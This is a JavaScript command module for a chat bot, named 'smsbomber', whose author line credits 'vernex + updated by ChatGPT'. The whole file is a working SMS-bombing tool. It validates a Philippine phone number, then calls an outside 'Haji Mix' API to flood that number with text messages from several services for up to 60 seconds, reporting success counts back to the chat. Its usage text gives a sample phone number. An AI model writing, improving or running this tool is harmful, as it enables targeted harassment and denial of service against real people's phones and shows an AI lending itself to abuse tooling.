const axios = require("axios");

module.exports = {
  config: {
    name: "smsbomber",
    version: "1.0.6",
    author: "vernex + updated by ChatGPT",
    description: "Send SMS to PH numbers only using Haji Mix API",
    cooldowns: 10,
    dependencies: {
      axios: ""
    }
  },

  run: async function ({ api, event, args }) {
    const { threadID, messageID } = event;

    if (!args[0] || !args[1]) {
      return api.sendMessage(
        "📤 Usage:\n/smsbomber [phone_number] [amount_in_seconds]\n\nExample:\n/smsbomber 09503596043 10",
        threadID,
        messageID
      );
    }

    const phone = args[0];
    const amount = parseInt(args[1]);

    // ✅ PH number validation
    const isValidPH = /^(\+639|09)\d{9}$/.test(phone);
    if (!isValidPH) {
      return api.sendMessage(
        "❌ Invalid number. Only Philippine numbers are allowed.\nFormat must be: 09XXXXXXXXX or +639XXXXXXXXX",
        threadID,
        messageID
      );
    }

    if (isNaN(amount) || amount <= 0 || amount > 60) {
      return api.sendMessage("❌ Invalid amount. Please enter a number between 1 and 60.", threadID, messageID);
    }

    try {
      await api.sendMessage(
        `📡 Bombing ${phone} for ${amount} seconds using Haji Mix API...`,
        threadID,
        messageID
      );

      const apiUrl = `https://haji-mix.up.railway.app/api/smsbomber?phone=${encodeURIComponent(phone)}&times=${amount}`;
      let messages = [];

      // --- Haji Mix API ---
      try {
        const response = await axios.get(apiUrl);
        const data = response.data;

        if (data.status) {
          const { total_success, total_failed, services } = data.details;

          let serviceStats = Object.entries(services)
            .map(([name, stats]) => `🔹 ${name}: ✅ ${stats.success} | ❌ ${stats.failed}`)
            .join("\n");

          messages.push(`
════『 𝗦𝗠𝗦 𝗕𝗢𝗠𝗕𝗘𝗥 - Haji Mix 』════

📞 Target: ${phone}
⏱ Duration: ${amount} seconds
✅ Success: ${total_success}
❌ Failed: ${total_failed}

📋 Service Stats:
${serviceStats}

> Use responsibly.
          `.trim());
        } else {
          messages.push(`❌ Haji Mix API failed: ${data.message || "Unknown error"}`);
        }
      } catch (err) {
        messages.push(`⚠️ Failed to connect to Haji Mix API: ${err.message}`);
      }

      // Final output
      return api.sendMessage(messages.join("\n\n"), threadID, messageID);

    } catch (error) {
      console.error("❌ Unexpected Error:", error.message);
      return api.sendMessage(`❌ Error: ${error.message}`, threadID, messageID);
    }
  }
};
